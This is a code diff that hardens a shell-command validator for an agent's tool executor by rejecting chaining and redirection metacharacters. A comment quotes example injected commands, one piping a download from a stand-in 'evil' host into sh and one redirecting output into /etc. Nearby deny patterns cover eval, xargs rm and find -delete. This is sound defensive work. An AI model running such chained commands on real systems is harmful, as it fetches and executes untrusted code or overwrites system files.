@@ -218,6 +218,23 @@ _CMD_SUBSTITUTION_RE = re.compile(r"\$\(|`")
 _EVAL_RE = re.compile(r"\beval\b")
 _XARGS_RM_RE = re.compile(r"\bxargs\b.*\brm\b")
 _FIND_DELETE_RE = re.compile(r"\bfind\b.*-delete")
+# Shell control/redirection metacharacters.  ``&&``/``||``/``;``/``|`` chain or
+# pipe commands and ``<``/``>`` redirect I/O, so a single auto-read executable
+# could smuggle an arbitrary second command or write to an arbitrary path
+# (``docker logs x && curl evil | sh``, ``docker inspect x > /etc/evil``).
+# Matching is intentionally conservative: the character is rejected even inside
+# a quoted argument, because a persistent shell would still interpret it.
+_SHELL_CONTROL_RE = re.compile(r"[&|;<>]")
+
+
+def has_shell_control_metacharacters(command: str) -> bool:
+    """Return True when *command* contains shell chaining or redirection.
+
+    This is the single source of truth shared by ``_parse_command`` and the
+    agent tool executor, so a command can never bypass the shell approval gate
+    by chaining or redirecting I/O.
+    """
+    return _SHELL_CONTROL_RE.search(command) is not None
 
 
 def _parse_command(command: str) -> list[str] | None:
@@ -226,6 +243,7 @@ def _parse_command(command: str) -> list[str] | None:
     Rejects:
     - NUL bytes
     - Newlines (command injection)
+    - Shell control/redirection metacharacters (&&, ||, |, ;, <, >, &)
     - Malformed quoting (ValueError from shlex)
     - Command substitution ($() or backticks)
     - eval
@@ -238,6 +256,10 @@ def _parse_command(command: str) -> list[str] | None:
 
     # Check for newlines (command injection)
     if _NEWLINE_RE.search(command):
+        return None
+
+    # Check for shell chaining/redirection metacharacters
+    if has_shell_control_metacharacters(command):
         return None
 
     # Check for command substitution
